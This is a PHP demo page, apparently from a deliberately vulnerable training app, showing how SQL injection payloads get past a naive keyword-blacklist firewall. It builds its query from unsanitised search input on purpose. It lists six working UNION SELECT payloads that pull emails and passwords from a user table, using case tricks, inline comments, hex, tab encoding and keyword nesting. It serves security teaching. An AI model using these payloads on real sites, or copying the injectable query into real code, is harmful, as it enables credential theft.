<?php
/**
 * DEMO: WAF Bypass Techniques
 *
 * This page adds a naive blacklist "WAF" (Web Application Firewall) that blocks
 * obvious SQL keywords, then shows how trivially each bypass technique works.
 *
 * Bypass techniques demonstrated:
 *   1. Case variation:          SeLeCt, UnIoN
 *   2. Comment obfuscation:     UN/**/ION SE/**/LECT
 *   3. Inline comment spacing:  SELECT/**/1
 *   4. Double encoding:         %2527 = %27 = '
 *   5. Equivalent functions:    MID() instead of SUBSTRING()
 *   6. Hex encoding:            0x61646d696e = 'admin'
 */

if ( ! defined('SQL_INJECTION_IN_PHP') ) {
    die('Direct access not permitted');
}

/**
 * Naive WAF — blocks obvious keywords.
 * This is the kind of "security" developers sometimes add thinking it's enough.
 */
function naive_waf(string $input): string {
    $blacklist = ['SELECT', 'UNION', 'DROP', 'INSERT', 'UPDATE', 'DELETE', 'WHERE', 'FROM', '--', '#'];
    return str_ireplace($blacklist, '[BLOCKED]', $input);
}

$message    = '';
$raw_input  = $_GET['search'] ?? '';
$waf_output = '';
$sql        = '';
$waf_active = isset($_GET['waf']) && $_GET['waf'] === '1';

if ($raw_input !== '') {
    if ($waf_active) {
        // Apply naive WAF
        $filtered   = naive_waf($raw_input);
        $waf_output = $filtered;
        $sql        = "SELECT id, firstname, lastname, email FROM user WHERE firstname LIKE '%{$filtered}%'";
    } else {
        $waf_output = $raw_input . ' (WAF disabled)';
        $sql        = "SELECT id, firstname, lastname, email FROM user WHERE firstname LIKE '%{$raw_input}%'";
    }

    echo '<div class="alert alert-secondary">';
    echo '<strong>Raw input:</strong> <code>' . htmlspecialchars($raw_input) . '</code><br>';
    echo '<strong>After WAF:</strong> <code>' . htmlspecialchars($waf_output) . '</code><br>';
    echo '<strong>Generated SQL:</strong> <code>' . htmlspecialchars($sql) . '</code>';
    echo '</div>';

    try {
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
        $result = $pdo->query($sql);

        if ($result && $result->rowCount() > 0) {
            echo '<table class="table table-bordered table-sm">';
            echo '<thead class="table-dark"><tr><th>ID</th><th>Firstname</th><th>Lastname</th><th>Email</th></tr></thead><tbody>';
            foreach ($result as $row) {
                echo '<tr>';
                echo '<td>' . htmlspecialchars($row['id']) . '</td>';
                echo '<td>' . htmlspecialchars($row['firstname']) . '</td>';
                echo '<td>' . htmlspecialchars($row['lastname']) . '</td>';
                echo '<td>' . htmlspecialchars($row['email']) . '</td>';
                echo '</tr>';
            }
            echo '</tbody></table>';
        } else {
            echo '<div class="alert alert-info">No results found.</div>';
        }
    } catch (\PDOException $e) {
        echo '<div class="alert alert-danger"><strong>DB Error:</strong> ' . htmlspecialchars($e->getMessage()) . '</div>';
    }
}
?>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">
    <strong>⚠️ WAF Bypass Techniques Demo</strong>
  </div>
  <div class="card-body">
    <p class="mb-2"><strong>This page has a naive keyword-blacklist "WAF".</strong> Toggle it on/off and observe how each bypass technique evades it.</p>

    <table class="table table-sm table-bordered mb-0">
      <thead class="table-dark">
        <tr><th>Technique</th><th>Example Payload (WAF ON)</th><th>Why It Works</th></tr>
      </thead>
      <tbody>
        <tr>
          <td>Case variation</td>
          <td><code>%' UnIoN SeLeCt 1,email,password,4 FrOm user-- </code></td>
          <td><code>str_ireplace</code> catches this, but many WAFs are case-sensitive</td>
        </tr>
        <tr>
          <td>Comment obfuscation</td>
          <td><code>%' UN/**/ION SE/**/LECT 1,email,password,4 FR/**/OM user-- </code></td>
          <td>MySQL ignores inline comments — WAF doesn't see UNION/SELECT/FROM</td>
        </tr>
        <tr>
          <td>Hex encoding values</td>
          <td><code>%' UNION SELECT 1,email,password,4 FROM user WHERE account_type=0x61646d696e-- </code></td>
          <td><code>0x61646d696e</code> = 'admin' — bypasses string-match WAFs</td>
        </tr>
        <tr>
          <td>Equivalent functions</td>
          <td><code>%' UNION SELECT 1,email,password,4 FROM user WHERE MID(account_type,1,5)='admin'-- </code></td>
          <td><code>MID()</code> = <code>SUBSTRING()</code> — WAFs block SUBSTRING, not MID</td>
        </tr>
        <tr>
          <td>Whitespace substitution</td>
          <td><code>%'%09UNION%09SELECT%091,email,password,4%09FROM%09user--</code></td>
          <td>Tab (<code>%09</code>), newline (<code>%0a</code>) are valid SQL whitespace</td>
        </tr>
        <tr>
          <td>Double keyword nesting</td>
          <td><code>%' UNUNIONION SESELECTLECT 1,email,password,4 FROM user-- </code></td>
          <td>Some WAFs strip the keyword once — leaving the inner copy intact</td>
        </tr>
      </tbody>
    </table>
  </div>
</div>

<!-- WAF Toggle -->
<div class="mb-3">
  <div class="btn-group" role="group">
    <a href="?action=waf_bypass&waf=1" class="btn btn-<?= $waf_active ? 'danger' : 'outline-danger' ?>">
      WAF ON (naive blacklist active)
    </a>
    <a href="?action=waf_bypass&waf=0" class="btn btn-<?= !$waf_active ? 'success' : 'outline-success' ?>">
      WAF OFF (no filtering)
    </a>
  </div>
  <span class="ms-3 badge bg-<?= $waf_active ? 'danger' : 'secondary' ?>">
    WAF is currently <?= $waf_active ? 'ENABLED' : 'DISABLED' ?>
  </span>
</div>

<form method="get" class="mb-3">
  <input type="hidden" name="action" value="waf_bypass"/>
  <input type="hidden" name="waf" value="<?= $waf_active ? '1' : '0' ?>"/>
  <div class="input-group">
    <input type="text" name="search" class="form-control"
           placeholder="Enter a search term or injection payload..."
           value="<?= htmlspecialchars($raw_input) ?>">
    <button class="btn btn-outline-secondary" type="submit">Search</button>
  </div>
</form>
